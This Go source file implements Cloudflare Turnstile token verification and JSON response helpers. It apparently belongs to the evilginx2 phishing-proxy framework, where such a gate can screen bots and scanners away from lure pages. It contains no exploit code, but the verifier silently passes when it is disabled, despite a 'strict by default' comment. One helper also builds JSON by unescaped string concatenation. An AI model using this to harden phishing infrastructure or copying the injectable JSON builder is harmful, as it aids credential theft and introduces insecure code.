package core

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"net/url"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

const (
	TurnstileVerifyURL = "https://challenges.cloudflare.com/turnstile/v0/siteverify"
	TurnstileTimeout   = 10 * time.Second
)

// TurnstileVerifier handles Cloudflare Turnstile token verification
type TurnstileVerifier struct {
	config     *Config
	httpClient *http.Client
}

// TurnstileVerifyRequest is the request payload for Cloudflare verification
type TurnstileVerifyRequest struct {
	Secret   string `json:"secret"`
	Response string `json:"response"`
	RemoteIP string `json:"remoteip,omitempty"`
}

// TurnstileVerifyResponse is the response from Cloudflare verification API
type TurnstileVerifyResponse struct {
	Success     bool     `json:"success"`
	ChallengeTS string   `json:"challenge_ts,omitempty"`
	Hostname    string   `json:"hostname,omitempty"`
	ErrorCodes  []string `json:"error-codes,omitempty"`
	Action      string   `json:"action,omitempty"`
	CData       string   `json:"cdata,omitempty"`
}

// NewTurnstileVerifier creates a new Turnstile verifier instance
func NewTurnstileVerifier(cfg *Config) *TurnstileVerifier {
	return &TurnstileVerifier{
		config: cfg,
		httpClient: &http.Client{
			Timeout: TurnstileTimeout,
		},
	}
}

// VerifyToken verifies a Turnstile token with Cloudflare's API (strict by default)
// Returns (verified, error). On error or failed verification, returns (false, error/ nil).
func (tv *TurnstileVerifier) VerifyToken(token, remoteIP string) (bool, error) {
	// Check if Turnstile is enabled
	if !tv.config.GetTurnstileEnabled() {
		log.Debug("turnstile: verification skipped (disabled)")
		return true, nil
	}

	secretKey := tv.config.GetTurnstileSecretKey()
	if secretKey == "" {
		log.Warning("turnstile: no secret key configured, skipping verification")
		return true, nil
	}

	if token == "" {
		log.Warning("turnstile: empty token received")
		return false, nil
	}

	// Prepare form data (Cloudflare expects form-urlencoded)
	formData := url.Values{}
	formData.Set("secret", secretKey)
	formData.Set("response", token)
	if remoteIP != "" {
		formData.Set("remoteip", remoteIP)
	}

	// Make the verification request
	resp, err := tv.httpClient.PostForm(TurnstileVerifyURL, formData)
	if err != nil {
		log.Warning("turnstile: verification request failed: %v", err)
		return false, err
	}
	defer resp.Body.Close()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Warning("turnstile: failed to read response: %v", err)
		return false, err
	}

	// Parse response
	var verifyResp TurnstileVerifyResponse
	if err := json.Unmarshal(body, &verifyResp); err != nil {
		log.Warning("turnstile: failed to parse response: %v", err)
		return false, err
	}

	if verifyResp.Success {
		log.Success("turnstile: token verified successfully (hostname: %s)", verifyResp.Hostname)
		return true, nil
	}

	// Verification failed
	log.Warning("turnstile: verification failed - errors: %v", verifyResp.ErrorCodes)
	return false, nil
}

// VerifyTokenStrict verifies a Turnstile token WITHOUT fallback
// Use this if you want strict verification (blocks on failure)
func (tv *TurnstileVerifier) VerifyTokenStrict(token, remoteIP string) (bool, error) {
	if !tv.config.GetTurnstileEnabled() {
		return true, nil
	}

	secretKey := tv.config.GetTurnstileSecretKey()
	if secretKey == "" {
		return true, nil
	}

	if token == "" {
		return false, nil
	}

	formData := url.Values{}
	formData.Set("secret", secretKey)
	formData.Set("response", token)
	if remoteIP != "" {
		formData.Set("remoteip", remoteIP)
	}

	resp, err := tv.httpClient.PostForm(TurnstileVerifyURL, formData)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}

	var verifyResp TurnstileVerifyResponse
	if err := json.Unmarshal(body, &verifyResp); err != nil {
		return false, err
	}

	return verifyResp.Success, nil
}

// TurnstileAPIResponse is the JSON response for the verification API endpoint
type TurnstileAPIResponse struct {
	Success     bool   `json:"success"`
	RedirectURL string `json:"redirect_url,omitempty"`
	Warning     string `json:"warning,omitempty"`
	Error       string `json:"error,omitempty"`
}

// CreateAPIResponse creates a JSON response for the frontend
func (tv *TurnstileVerifier) CreateAPIResponse(success bool, redirectURL, warning, errMsg string) []byte {
	resp := TurnstileAPIResponse{
		Success:     success,
		RedirectURL: redirectURL,
		Warning:     warning,
		Error:       errMsg,
	}
	data, _ := json.Marshal(resp)
	return data
}

// Helper to create JSON response bytes
func TurnstileJSONResponse(success bool, redirectURL, warning, errMsg string) []byte {
	var buf bytes.Buffer
	buf.WriteString(`{"success":`)
	if success {
		buf.WriteString("true")
	} else {
		buf.WriteString("false")
	}
	if redirectURL != "" {
		buf.WriteString(`,"redirect_url":"`)
		buf.WriteString(redirectURL)
		buf.WriteString(`"`)
	}
	if warning != "" {
		buf.WriteString(`,"warning":"`)
		buf.WriteString(warning)
		buf.WriteString(`"`)
	}
	if errMsg != "" {
		buf.WriteString(`,"error":"`)
		buf.WriteString(errMsg)
		buf.WriteString(`"`)
	}
	buf.WriteString("}")
	return buf.Bytes()
}
